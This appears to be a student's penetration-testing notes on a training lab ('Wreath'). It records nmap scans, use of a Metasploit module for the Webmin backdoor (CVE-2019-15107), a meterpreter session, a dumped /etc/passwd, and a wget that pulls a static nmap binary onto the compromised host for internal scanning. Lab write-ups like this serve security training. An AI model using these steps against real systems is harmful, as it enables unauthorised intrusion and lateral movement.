---
title: "wreath"
tags:
  - fetus
---
## initial recon on the prod-serv:
- a scan results:
```sh fold title:Ascan
# Nmap 7.95 scan initiated Fri Oct 17 07:48:50 2025 as: /usr/lib/nmap/nmap -vvv -p 22,80,443,10000 -4 -sSCV --open -oN Ascan.txt 10.200.180.200
Nmap scan report for 10.200.180.200
Host is up, received echo-reply ttl 63 (0.31s latency).
Scanned at 2025-10-17 07:48:50 +06 for 61s

PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfKbbFLiRV9dqsrYQifAghp85qmXpYEHf2g4JJqDKUL316TcAoGj62aamfhx5isIJHtQsA0hVmzD+4pVH4r8ANkuIIRs6j9cnBrLGpjk8xz9+BE1Vvd8lmORGxCqTv+9LgrpB7tcfoEkIOSG7zeY182kOR72igUERpy0JkzxJm2gIGb7Caz1s5/ScHEOhGX8VhNT4clOhDc9dLePRQvRooicIsENqQsLckE0eJB7rTSxemWduL+twySqtwN80a7pRzS7dzR4f6fkhVBAhYflJBW3iZ46zOItZcwT2u0wReCrFzxvDxEOewH7YHFpvOvb+Exuf3W6OuSjCHF64S7iU6z92aINNf+dSROACXbmGnBhTlGaV57brOXzujsWDylivWZ7CVVj1gB6mrNfEpBNE983qZskyVk4eTNT5cUD+3I/IPOz1bOtOWiraZCevFYaQR5AxNmx8sDIgo1z4VcxOMhrczc7RC/s3KWcoIkI2cI5+KUnDtaOfUClXPBCgYE50=
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFccvYHwpGWYUsw9mTk/mEvzyrY4ghhX2D6o3n/upTLFXbhJPV6ls4C8O0wH6TyGq7ClV3XpVa7zevngNoqlwzM=
|   256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINLfVtZHSGvCy3JP5GX0Dgzcxz+Y9In0TcQc3vhvMXCP
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open  ssl/http syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/emailAddress=me@thomaswreath.thm/localityName=Easingwold
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/emailAddress=me@thomaswreath.thm/localityName=Easingwold
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-17T01:45:18
| Not valid after:  2026-10-17T01:45:18
| MD5:   3b04:1b49:e209:6432:3bba:08c0:37ca:b999
| SHA-1: 5f60:9564:96e7:5660:7d60:2a99:b9a7:8107:4f8c:4e92
| -----BEGIN CERTIFICATE-----
| MIIELTCCAxWgAwIBAgIUDFNC1MCx8HD34vCUyKsHVrwQFfgwDQYJKoZIhvcNAQEL
| BQAwgaUxCzAJBgNVBAYTAkdCMR4wHAYDVQQIDBVFYXN0IFJpZGluZyBZb3Jrc2hp
| cmUxEzARBgNVBAcMCkVhc2luZ3dvbGQxIjAgBgNVBAoMGVRob21hcyBXcmVhdGgg
| RGV2ZWxvcG1lbnQxGTAXBgNVBAMMEHRob21hc3dyZWF0aC50aG0xIjAgBgkqhkiG
| 9w0BCQEWE21lQHRob21hc3dyZWF0aC50aG0wHhcNMjUxMDE3MDE0NTE4WhcNMjYx
| MDE3MDE0NTE4WjCBpTELMAkGA1UEBhMCR0IxHjAcBgNVBAgMFUVhc3QgUmlkaW5n
| IFlvcmtzaGlyZTETMBEGA1UEBwwKRWFzaW5nd29sZDEiMCAGA1UECgwZVGhvbWFz
| IFdyZWF0aCBEZXZlbG9wbWVudDEZMBcGA1UEAwwQdGhvbWFzd3JlYXRoLnRobTEi
| MCAGCSqGSIb3DQEJARYTbWVAdGhvbWFzd3JlYXRoLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAOtG53rluAA7v6Z66l9pQpR6Afhvi71yzSpArVXT
| zpMQU1Jf08mlkkPelJdXzSLXlLecjnLA8Nqrogu9pcPJnEEp4BgSQFTVEHKIvh+y
| SHmEJNh0Ydd1wPAX1Oq2i8Q7cFE1SvcUaH5iznPhqIBsC7ZSJnzxhu0AngKUBlXU
| jTLBeNYLFZI5WGKRCG2DtqyiClGFBijLwybH0L4OgTQWc1fW6FfbbcW17s4dugUq
| K1Uojun9eCJJ71XfYIqmPykMYuOMNXw8VaTRpdd0Mp5u7jCVoN1z4tAtI2LeRfkt
| mlpuNcf+CB+/eli9thgRuqKeEzzbgjRT0Whpcg/iDa3ZL8cCAwEAAaNTMFEwHQYD
| VR0OBBYEFNzlSgH5B6Q9usMjFCymCkmw8xUCMB8GA1UdIwQYMBaAFNzlSgH5B6Q9
| usMjFCymCkmw8xUCMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AI8VvEsXuYHWQVvT5TlZv1qGpmJ9kyH3YsYN3p+TTxm4FtLzk9hjRVYAQSTbJYlm
| bnyEWmIOf8ozHoe6oS5PKzOPBFDvzR/AJaGLrsx+XLM3MG68VPEwrEq8v5rqsNG6
| ntL9p9t2HKQ5sffOQb3fPz/Hakx7N6Oq6F00jpEodaitXCHILus2fmk7Dx/SUt2X
| j4OXurKJnzolbrVdsY7l9xj/huwib18K3D2W44nkH3FiFYQlNxnX4GNe/LY9iaKK
| eHvun3CbH1l7gC96Bjv0BHNqA8RxK0LnH0DGMwlDfcqP5i3b12m+KmeuPAZ65Db8
| R1Yvq7j4BHEzZETTShHQjco=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
10000/tcp open  http     syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 99F425766CF29EDA9D51DB4B6298FA83
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.890

Aggressive OS guesses: Linux 4.15 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 - 5.14 (93%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 - 5.19 (90%), Linux 2.6.32 - 3.10 (89%), HP P2000 G3 NAS device (89%), Linux 4.4 (88%), Linux 2.6.32 (88%)
No exact OS matches for host (test conditions non-ideal).

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 17 07:49:51 2025 -- 1 IP address (1 host up) scanned in 60.93 seconds
```
#### http recon on port 80
- http on port 80 redirects to `https://thomaswreath.thm`
- added the following entry to my `/etc/hosts`
```sh
10.200.180.200  thomaswreath.thm
```
- hello Thomas Wreath <br>
![[httpSiteThomasWreath.png]]
- contacts:
```sh
Address
21 Highland Court,
Easingwold,
East Riding,
Yorkshire,
England,
YO61 3QL

Phone Number
01347 822945

Mobile Number
+447821548812

Email
me@thomaswreath.thm
```
#### http recon on port 10000 
- webmin admin portal on 10000: <br>
![[wreathWebminOn10000.png]]
- metasploit module for backdoor (CVE-2019-15107):
```sh
use linux/http/webmin_backdoor
```
- 10.200.180.200 pwned <br>
![[wreath200HasBeenPwned.png]]
- got meterpreter with `multi/manage/shell_to_meterpreter`
- `/etc/passwd`:
``` c
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:996:User for polkitd:/:/sbin/nologin
libstoragemgmt:x:997:995:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
cockpit-ws:x:996:993:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:992:User for cockpit-ws instances:/nonexisting:/sbin/nologin
sssd:x:994:990:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:993:989::/var/lib/chrony:/sbin/nologin
rngd:x:992:988:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
twreath:x:1000:1000:Thomas Wreath:/home/twreath:/bin/bash
unbound:x:991:987:Unbound DNS resolver:/etc/unbound:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
nginx:x:990:986:Nginx web server:/var/lib/nginx:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
```

#### internal network enum:
- transferred a static nmap binary by doing this at `/tmp`:
```sh
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
```

```sh
./nmap-vorpidi -sn 10.200.180.0/24 -oN scan

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-05 13:47 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-180-1.eu-west-1.compute.internal (10.200.180.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.18s latency).
MAC Address: 06:BE:BA:7A:E6:87 (Unknown)
Nmap scan report for ip-10-200-180-100.eu-west-1.compute.internal (10.200.180.100)
Host is up (0.00019s latency).
MAC Address: 06:C1:A2:3A:A8:43 (Unknown)
Nmap scan report for ip-10-200-180-150.eu-west-1.compute.internal (10.200.180.150)
Host is up (0.00025s latency).
MAC Address: 06:EF:AA:2A:64:F7 (Unknown)
Nmap scan report for ip-10-200-180-250.eu-west-1.compute.internal (10.200.180.250)
Host is up (0.00037s latency).
MAC Address: 06:EE:81:EB:5F:CB (Unknown)
Nmap scan report for ip-10-200-180-200.eu-west-1.compute.internal (10.200.180.200)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.82 seconds
```

```sh
./nmap -sn 10.200.180.0/24 -oN scan
```
